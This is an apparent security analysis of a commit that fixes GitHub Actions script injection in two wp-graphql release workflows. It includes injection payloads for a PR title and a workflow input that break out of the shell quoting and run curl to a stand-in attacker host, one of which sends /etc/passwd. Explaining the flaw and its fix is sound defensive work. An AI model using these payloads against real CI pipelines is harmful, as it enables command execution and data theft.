## Analysis

### What the commit changes

This commit modifies two GitHub Actions workflow files:

1. **`.github/workflows/release-please.yml`** — CI/CD workflow for automated releases
2. **`.github/workflows/update-release-pr.yml`** — CI/CD workflow that updates Release PRs

The change is systematic and consistent across both files: **every `${{ }}` GitHub Actions context expression that was embedded directly inside a `run:` shell script block is moved into an `env:` block**, and then referenced inside the shell script via the corresponding environment variable (e.g., `$VARIABLE_NAME`).

### The security vulnerability being fixed

This is a classic **GitHub Actions script injection** vulnerability. Here is why it is exploitable:

**How GitHub Actions processes `${{ }}` in `run:` blocks:**
In GitHub Actions, the `${{ }}` expression syntax is evaluated by GitHub's expression parser **before** the shell script is handed to the shell. The resulting text becomes part of the shell script verbatim. This means that even wrapping `${{ }}` expressions in single quotes does **not** protect against injection — if the expanded value itself contains characters like `'`, `"`, `;`, `` ` ``, or `$()`, it breaks out of the quoting and becomes shell syntax.

**Attacker-controlled data sources in the before code:**

| File | Line (before) | Expression | Data Source |
|------|--------------|-----------|-------------|
| `update-release-pr.yml` | 63 | `${{ github.event.pull_request.title }}` | PR title (attacker-controlled) |
| `update-release-pr.yml` | 64 | `${{ github.head_ref }}` | Branch name (attacker-controlled) |
| `release-please.yml` | 147, 266 | `${{ github.event.inputs.redeploy_tag }}` | Workflow dispatch input (attacker-controlled with write access) |
| `release-please.yml` | 490-491 | `${{ secrets.SVN_USERNAME }}`, `${{ secrets.SVN_PASSWORD }}` | Secrets exposed in command-line args |

**Exploitation scenario for `update-release-pr.yml`:**
An attacker creates a PR with a branch name starting with `release-please--` (which passes the guard at line 34) and sets a PR title such as:
```
chore(main): release wp-graphql 2.7.0"); curl http://attacker.com/$(cat /etc/passwd); echo "
```
After GitHub expands `${{ github.event.pull_request.title }}`, the shell sees:
```bash
PR_TITLE="chore(main): release wp-graphql 2.7.0"); curl http://attacker.com/$(cat /etc/passwd); echo ""
```
The attacker's injected `);` and `curl` command execute arbitrary OS commands.

**Exploitation scenario for `release-please.yml`:**
An attacker with `workflow_dispatch` access provides a `redeploy_tag` input like:
```
wp-graphql/v2.7.0"; curl http://attacker.com/exfil; echo "
```
After expansion, the shell sees:
```bash
TAG="wp-graphql/v2.7.0"; curl http://attacker.com/exfil; echo ""
```

**Secrets exposure:**
In the before code, `${{ secrets.SVN_USERNAME }}` and `${{ secrets.SVN_PASSWORD }}` are injected directly into the shell script text as command-line arguments:
```bash
svn delete ... --username "${{ secrets.SVN_USERNAME }}" --password "${{ secrets.SVN_PASSWORD }}" ...
```
This makes the secrets part of the shell script source code, potentially exposing them in error tracebacks, debug outputs, and process listings. Moving them to `env:` blocks limits this exposure.

**Why the fix works:**
In GitHub Actions, when values are set via `env:` blocks, they become actual OS-level environment variables. Shell variable references (`$VAR`) within the `run:` script are resolved by the shell at runtime through environment variable lookup, which does **not** interpret shell metacharacters in the value. The attacker-controlled data thus stays data — it can never become code.

### Classification

This commit fixes an **OS Command Injection** vulnerability (CWE-78). The attacker-controlled data (`github.event.pull_request.title`, `github.head_ref`, `github.event.inputs.redeploy_tag`) flows into shell scripts where it can alter command syntax and execute arbitrary OS commands.
